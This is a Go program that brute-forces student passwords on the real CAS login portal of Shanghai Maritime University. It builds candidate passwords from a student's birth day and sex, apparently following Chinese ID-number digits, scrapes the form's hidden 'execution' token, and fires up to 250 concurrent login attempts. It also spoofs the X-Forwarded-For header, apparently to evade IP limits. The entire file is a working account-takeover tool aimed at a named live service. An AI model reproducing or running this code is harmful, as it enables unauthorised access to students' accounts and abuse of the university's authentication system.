package main

import (
	"fmt"
	"github.com/PuerkitoBio/goquery"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

const baseURL = "https://cas.shmtu.edu.cn/cas/login?service=https%3A%2F%2Fportal.shmtu.edu.cn%2Fnode"

// 并发
const limit = 250

// 性别
var isBoy = 1

// 学号
var stuNumber string

// 默认1号出生
var birthday = "01"

// 结束信号
var done string

func main() {
	// 获取用户输入
	fmt.Printf("请输入学号:")
	_, _ = fmt.Scanln(&stuNumber)
	fmt.Printf("请输入性别(男为1, 女为0):")
	_, _ = fmt.Scanln(&isBoy)
	fmt.Printf("请输入生日(01-31, 没有就回车):")
	_, _ = fmt.Scanln(&birthday)
	startTime := time.Now()

	var list = generatePassword(isBoy, birthday)
	var execution = getParam()
	var once sync.Once
	result := make(chan string)
	ch := make(chan struct{}, limit)

	for _, v := range list {
		ch <- struct{}{}
		go func(password string, ch chan struct{}, result chan string) {
			ok := getResult(stuNumber, password, execution)
			if ok {
				once.Do(func() {
					result <- password
				})
			}
			<-ch
		}(v, ch, result)
	}
	fmt.Println(<- result)
	endTime := time.Now()
	fmt.Println(endTime.Sub(startTime))
	fmt.Println("按任意键结束程序:")
	_, _ = fmt.Scanln(&done)
}

// 验证密码, 请求返回200代表密码正确
func getResult(username string, password string, execution string) (success bool) {
	postValue := url.Values{
		"username":  {username},
		"password":  {password},
		"execution": {execution},
		"_eventId":  {"submit"},
	}
	postString := postValue.Encode()
	client := &http.Client{}
	request, _ := http.NewRequest("POST", baseURL, strings.NewReader(postString))
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	request.Header.Add("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3)")
	request.Header.Add("X-Forwarded-For", "127.0.0.1")
	request.Close = true

	resp, err := client.Do(request)
	if err != nil {
		return false
	}
	defer func() {
		resp.Body.Close()
		fmt.Println(resp.StatusCode, password)
	}()

	return resp.StatusCode == 200
}

// 获取隐藏的表单值execution
func getParam() (execution string) {
	response, e := http.Get(baseURL)
	if e != nil {
		fmt.Println("网络错误: 获取execution失败", e)
	}
	defer response.Body.Close()

	doc, _ := goquery.NewDocumentFromReader(response.Body)
	executionDom := doc.Find("input[name='execution']")
	execution, _ = executionDom.Attr("value")

	return execution
}

func generatePassword(isOdd int, birthday string) []string {
	var list []string

	for i := 0; i < 320000; i++ {
		if i / 10 % 2 != isOdd {
			continue
		}
		if i < 10 {
			list = append(list, fmt.Sprintf("%s000%d", birthday, i))
		}
		if i < 100 && i >= 10 {
			list = append(list, fmt.Sprintf("%s00%d", birthday, i))
		}
		if i < 1000 && i >= 100 {
			list = append(list, fmt.Sprintf("%s0%d", birthday, i))
		}
		if i < 10000 && i >= 1000 {
			list = append(list, fmt.Sprintf("%s%d", birthday, i))
		}
		// 如果没有提供出生日期
		if birthday == "01" {
			if i < 100000 && i >= 10000 {
				list = append(list, fmt.Sprintf("0%d",i))
			}
			if i >= 100000 {
				list = append(list, fmt.Sprintf("%d",i))
			}
		}
	}
	return list
}